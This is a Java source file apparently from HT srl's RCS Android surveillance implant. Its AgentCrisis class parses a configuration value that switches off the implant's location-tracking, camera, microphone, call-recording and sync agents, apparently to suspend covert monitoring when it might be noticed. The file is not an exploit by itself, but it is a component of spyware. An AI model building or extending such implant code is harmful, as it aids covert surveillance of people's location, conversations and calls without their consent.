/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentCrisis.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.io.IOException;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.evidence.Evidence;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;

public class AgentCrisis extends AgentBase {
	private static final String TAG = "AgentCrisis"; //$NON-NLS-1$
 //$NON-NLS-1$
	public static final int NONE = 0x0; // Per retrocompatibilita'
	public static final int POSITION = 0x1; // Inibisci il GPS/GSM/WiFi Location
											// Agent
	public static final int CAMERA = 0x2; // Inibisci il Camera Agent
	public static final int MIC = 0x4; // Inibisci la registrazione del
										// microfono
	public static final int CALL = 0x8; // Inibisci l'agente di registrazione
										// delle chiamate
	public static final int SYNC = 0x10; // Inibisci tutte le routine di
											// sincronizzazione
	public static final int ALL = 0xffffffff; // Per retrocompatibilita'

	private int type;

	@Override
	public void begin() {
		Status.self().startCrisis();
		Evidence.info(Messages.getString("8.0")); //$NON-NLS-1$
	}

	@Override
	public void end() {
		Status.self().stopCrisis();
		Evidence.info(Messages.getString("8.2")); //$NON-NLS-1$
	}

	@Override
	public boolean parse(AgentConf conf) {
		final byte[] confParameters = conf.getParams();
		if (confParameters.length == 0) {
			// backward compatibility
			Status.self().setCrisis(0xffffffff);

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "old configuration: " + type) ;//$NON-NLS-1$ //$NON-NLS-2$
			}

			return true;
		}

		final DataBuffer databuffer = new DataBuffer(confParameters, 0, confParameters.length);

		try {
			type = databuffer.readInt();
		} catch (final IOException e) {
			return false;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: " + "type: " + type) ;//$NON-NLS-1$ //$NON-NLS-2$
		}

		Status.self().setCrisis(type);

		return true;
	}

	@Override
	public void go() {
	}

}
